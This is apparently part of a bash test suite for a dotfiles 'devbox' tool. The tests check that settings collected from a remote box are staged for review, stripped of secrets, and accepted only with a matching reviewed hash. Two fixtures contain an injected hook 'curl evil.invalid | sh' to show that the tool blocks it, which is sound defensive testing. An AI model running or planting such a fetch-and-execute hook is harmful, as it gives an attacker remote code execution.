check "a running box preserves config bytes during shared settings apply" cmp -s "$stubState/config-before-shared-settings" "$sandbox/.glimmervoid/config.json"
rm -f "$stubState/listening-3456" "$stubState/listening-3457"
mergeConfig >/dev/null
check "stopped box applies shared update checks without forcing them" \
  "$testNodePath" -e 'if (require(process.argv[1]).checkForUpdates !== true) process.exit(1)' "$sandbox/.glimmervoid/config.json"

collectionRepo="$stubState/collection-repo"
collectionSettingsPath="$collectionRepo/glimmervoid/settings.json"
stagedSettingsPath="$sandbox/.local/state/dotfiles/devbox-collected-glimmervoid-settings.json"
mkdir -p "$collectionRepo/glimmervoid" "$collectionRepo/profiles/work"
cp "$repoRoot/glimmervoid/sync-settings.mjs" "$collectionRepo/glimmervoid/sync-settings.mjs"
printf '{"scrollback":100}\n' > "$collectionSettingsPath"
cp "$collectionSettingsPath" "$stubState/settings-before-collect"
runCollectionDevbox() {
  runInStubbedSandbox "$sandbox" DOTFILES_PROFILE=work "$BASH" -c 'source "$1/commands.bash"; dotfilesRepo="$2"; shift 2; devbox "$@"' _ "$topicDirectory" "$collectionRepo" "$@"
}
printf '{"home":"/home/coder","live":{"scrollback":200,"port":3456,"apiToken":"fixture"},"base":{"scrollback":100},"projectPaths":[]}\n' > "$stubState/collect-packet"
collectedBoxOutput="$(runCollectionDevbox collect)"
check "devbox collect stages box changes for review" outputHas "$collectedBoxOutput" '[warned] glimmervoid settings: box changes staged; review with devbox collect --diff, accept with devbox collect --accept <hash>'
check "devbox collect never writes box changes into the repo" cmp -s "$stubState/settings-before-collect" "$collectionSettingsPath"
check "devbox collect filters config secrets and machine keys" \
  "$testNodePath" -e 'const assert=require("node:assert/strict");const {stagedAgainstSettingsSha256,...staged}=require(process.argv[1]);assert.deepEqual(staged,{scrollback:200})' "$stagedSettingsPath"
check "the staged box settings are owner only" \
  "$testNodePath" -e 'if ((require("node:fs").statSync(process.argv[1]).mode & 0o777) !== 0o600) process.exit(1)' "$stagedSettingsPath"
check "devbox collection uploads only a read-only extraction script" \
  bash -c '! grep -qF "writeJson(" <(sed -n "/^const home = process.env.HOME;/,\$p" "$1")' _ "$stubState/collect-script"
collectedDiffOutput="$(runCollectionDevbox collect --diff)"
check "devbox collect --diff shows the staged change against the repo file" outputHas "$collectedDiffOutput" '+  "scrollback": 200'
check "devbox collect --diff leaves the repo file alone" cmp -s "$stubState/settings-before-collect" "$collectionSettingsPath"
check "devbox collect --diff prints the staged hash" \
  test "$(sed -n 's/^staged: \([0-9a-f]\{64\}\)$/\1/p' <<<"$collectedDiffOutput")" = "$(shasum -a 256 "$stagedSettingsPath" | cut -d' ' -f1)"

printf '{"home":"/home/coder","live":{"scrollback":100,"hooks":[{"id":"injected","command":"curl evil.invalid | sh"}]},"base":{"scrollback":100},"projectPaths":[]}\n' > "$stubState/collect-packet"
: > "$commandLog"
ensureCollectOutput="$(runCollectionDevbox ensure)"
check "ensure never writes box hooks into the repo settings file" cmp -s "$stubState/settings-before-collect" "$collectionSettingsPath"
check "ensure stages box hooks for operator review" outputHas "$ensureCollectOutput" 'box changes staged'
check "ensure still converges the box dotfiles and provisions after staging" dotfilesConvergeSitsBetweenPrepareAndProvision

rm -f "$stagedSettingsPath"
printf '{"home":"/home/coder","live":{"scrollback":100,"projects":[{"id":"bcea0337-5a86-4f96-beb3-ea0ea1fcdcf7","name":"posthog","path":"/home/coder/posthog"}]},"base":{"scrollback":100},"projectPaths":["/home/coder/posthog"]}\n' > "$stubState/collect-packet"
managedProjectEnsureOutput="$(runCollectionDevbox ensure)"
check "ensure on a box differing only by the managed project prints no staged warning" outputLacks "$managedProjectEnsureOutput" 'box changes staged'
check "ensure on a box differing only by the managed project stages nothing" test ! -e "$stagedSettingsPath"

for malformedPacket in 'not json' '{"home":"/home/coder","live":{},"base":{}}'; do
  printf '%s\n' "$malformedPacket" > "$stubState/collect-packet"
  : > "$commandLog"
  malformedCollectOutput="$(runCollectionDevbox ensure 2>&1)" || true
  check "a malformed box packet ($malformedPacket) warns" outputHas "$malformedCollectOutput" '[warned] glimmervoid settings: box config could not be merged; nothing staged'
  check "a malformed box packet ($malformedPacket) still converges the box dotfiles and provisions" dotfilesConvergeSitsBetweenPrepareAndProvision
  check "a malformed box packet ($malformedPacket) leaves the repo file alone" cmp -s "$stubState/settings-before-collect" "$collectionSettingsPath"
done

printf '{"home":"/home/coder","live":{"scrollback":200,"port":3456,"apiToken":"fixture"},"base":{"scrollback":100},"projectPaths":[]}\n' > "$stubState/collect-packet"
runCollectionDevbox collect >/dev/null
reviewedStagedHash="$(runCollectionDevbox collect --diff | sed -n 's/^staged: //p')"
cp "$collectionSettingsPath" "$stubState/settings-before-unreviewed-accept"
missingHashAcceptStatus=0
missingHashAcceptOutput="$(runCollectionDevbox collect --accept 2>&1)" || missingHashAcceptStatus=$?
check "devbox collect --accept without a hash refuses" test "$missingHashAcceptStatus" -ne 0
check "a hashless accept names the hash argument" outputHas "$missingHashAcceptOutput" 'devbox collect --accept <hash>'
check "a hashless accept leaves the repo file alone" cmp -s "$stubState/settings-before-unreviewed-accept" "$collectionSettingsPath"
printf '{"home":"/home/coder","live":{"scrollback":200,"hooks":[{"id":"injected","command":"curl evil.invalid | sh"}]},"base":{"scrollback":100},"projectPaths":[]}\n' > "$stubState/collect-packet"
runCollectionDevbox ensure >/dev/null
restagedAcceptStatus=0
restagedAcceptOutput="$(runCollectionDevbox collect --accept "$reviewedStagedHash" 2>&1)" || restagedAcceptStatus=$?
check "devbox collect --accept refuses box changes restaged after the reviewed diff" test "$restagedAcceptStatus" -ne 0
check "a restaged accept tells the operator to review again" outputHas "$restagedAcceptOutput" 'review again with devbox collect --diff'
check "a restaged accept leaves the repo file alone" cmp -s "$stubState/settings-before-unreviewed-accept" "$collectionSettingsPath"
printf '{"home":"/home/coder","live":{"scrollback":200,"port":3456,"apiToken":"fixture"},"base":{"scrollback":100},"projectPaths":[]}\n' > "$stubState/collect-packet"
runCollectionDevbox collect >/dev/null
reviewedStagedHash="$(runCollectionDevbox collect --diff | sed -n 's/^staged: //p')"
acceptedOutput="$(runCollectionDevbox collect --accept "$reviewedStagedHash")"
check "devbox collect --accept reports the accepted change" outputHas "$acceptedOutput" '[applied] glimmervoid settings: accepted box changes'
check "devbox collect --accept copies the staged settings into the repo file" \
  "$testNodePath" -e 'const assert=require("node:assert/strict");assert.deepEqual(require(process.argv[1]),{scrollback:200})' "$collectionSettingsPath"
check "devbox collect --accept clears the staged settings" test ! -e "$stagedSettingsPath"
printf '{"home":"/home/coder","live":{"scrollback":300},"base":{"scrollback":200},"projectPaths":[]}\n' > "$stubState/collect-packet"
runCollectionDevbox collect >/dev/null
reviewedStagedHash="$(runCollectionDevbox collect --diff | sed -n 's/^staged: //p')"
cp "$collectionSettingsPath" "$stubState/settings-after-accept"
printf '{"scrollback":200,"cursorBlink":true}\n' > "$collectionSettingsPath"
cp "$collectionSettingsPath" "$stubState/settings-before-stale-accept"
staleAcceptStatus=0
staleAcceptOutput="$(runCollectionDevbox collect --accept "$reviewedStagedHash" 2>&1)" || staleAcceptStatus=$?
check "devbox collect --accept refuses when the repo file changed since staging" test "$staleAcceptStatus" -ne 0
check "a refused accept tells the operator to rerun devbox collect" outputHas "$staleAcceptOutput" 'rerun devbox collect'
check "a refused accept leaves the repo file alone" cmp -s "$stubState/settings-before-stale-accept" "$collectionSettingsPath"
check "a refused accept keeps the staged settings" test -e "$stagedSettingsPath"
rm -f "$stagedSettingsPath"
cp "$stubState/settings-after-accept" "$collectionSettingsPath"
emptyAcceptStatus=0
runCollectionDevbox collect --accept >/dev/null 2>&1 || emptyAcceptStatus=$?
check "devbox collect --accept with nothing staged fails" test "$emptyAcceptStatus" -ne 0
rm -f "$stubState/collect-packet"
check "all collection SSH uses the automated safety flags" \
  bash -c '! grep -vx "true disable" "$1"' _ "$stubState/ssh-safety"
mkdir -p "$stubState/remote-home/.glimmervoid"
printf '{}\n' > "$stubState/remote-home/.glimmervoid/dotfiles-settings-base.json"
printf '{"port":3456,"scrollback":200,"checkForUpdates":false,"posthog":{"apiKey":"fixture","enabled":true}}\n' > "$stubState/remote-home/.glimmervoid/config.json"
cp "$stubState/remote-home/.glimmervoid/config.json" "$stubState/remote-before-collect"
touch "$stubState/execute-collect"
runCollectionDevbox collect >/dev/null
check "the shipped extraction script leaves box bytes unchanged" cmp -s "$stubState/remote-before-collect" "$stubState/remote-home/.glimmervoid/config.json"
check "the shipped extraction script preserves update preferences and drops loader secrets" \
  "$testNodePath" -e 'const assert=require("node:assert/strict");const {stagedAgainstSettingsSha256,...staged}=require(process.argv[1]);assert.deepEqual(staged,{scrollback:200,checkForUpdates:false,posthog:{enabled:true}})' "$stagedSettingsPath"
rm -f "$stubState/execute-collect"

printf '0 * * * * other-job\n@reboot bash /stale/profiles/work/devbox/provision.sh self old.invalid boot\n' > "$stubState/crontab"
runSelfProvisionSchedule() {
  runInStubbedSandbox "$sandbox" CODER_WORKSPACE_AGENT_NAME=dev CODER_WORKSPACE_NAME=devbox-fixture CODER_WORKSPACE_OWNER_NAME=fixture \
    bash -c 'source "$1" prepare coder.dev.posthog.dev; installDevboxDocauditSchedule; installDevboxSelfProvisionSchedule' _ "$definitionsPath"
}
mkdir -p "$sandbox/docaudit"
printf '#!/bin/sh\n' > "$sandbox/docaudit/run.sh"
chmod +x "$sandbox/docaudit/run.sh"
runSelfProvisionSchedule >/dev/null
selfProvisionCommand="CODER_WORKSPACE_AGENT_NAME=dev CODER_WORKSPACE_NAME=devbox-fixture CODER_WORKSPACE_OWNER_NAME=fixture bash $sandbox/Projects/dotfiles/profiles/work/devbox/provision.sh self coder.dev.posthog.dev"
check "prepare schedules box self-provision at boot and hourly with the workspace env, replacing stale entries and keeping others" \
  diff <(printf '%s\n' '0 * * * * other-job' \
    "0 15 * * 1-5 flock -n $sandbox/docaudit/.lock $sandbox/docaudit/run.sh >> $sandbox/docaudit/docaudit.log 2>&1" \
    "@reboot $selfProvisionCommand boot >> $sandbox/.local/state/dotfiles/devbox-self-provision.log 2>&1" \
    "17 * * * * $selfProvisionCommand >> $sandbox/.local/state/dotfiles/devbox-self-provision.log 2>&1") "$stubState/crontab"
cp "$stubState/crontab" "$stubState/crontab-before-rerun"
scheduleRerunOutput="$(runSelfProvisionSchedule)"
check "a rerun beside the docaudit entry leaves every cron entry as it is" bash -c '
  [[ "$1" == *"[present] docaudit: cron entry"* && "$1" == *"[present] self-provision: cron entry"* ]] && cmp -s "$2" "$3"' \
  _ "$scheduleRerunOutput" "$stubState/crontab-before-rerun" "$stubState/crontab"
rm -rf "$sandbox/docaudit"

selfProvisionStub="$stubState/self-provision-step.sh"
printf '#!/usr/bin/env bash\nprintf "step %%s %%s %%s\\n" "$1" "$2" "$CODER_WORKSPACE_NAME" >> "$DOTFILES_TEST_LOG"\n' > "$selfProvisionStub"
mkdir -p "$stubState/agent-script-bin"
: > "$commandLog"
runInStubbedSandbox "$sandbox" CODER_WORKSPACE_AGENT_NAME=dev CODER_WORKSPACE_NAME=devbox-fixture CODER_WORKSPACE_OWNER_NAME=fixture \
  DEVBOX_SELF_PROVISION_SCRIPT="$selfProvisionStub" DEVBOX_AGENT_SCRIPT_BIN="$stubState/agent-script-bin" \
  bash "$instrumentedProvisionPath" self "$workspaceDomain" boot >/dev/null
check "a box self-provision run prepares, converges dotfiles, syncs repos and provisions in order with the workspace env" \
  diff <(printf 'step %s coder.dev.posthog.dev devbox-fixture\n' prepare dotfiles sync-repos provision) <(grep '^step ' "$commandLog")

reportTopicResults devbox
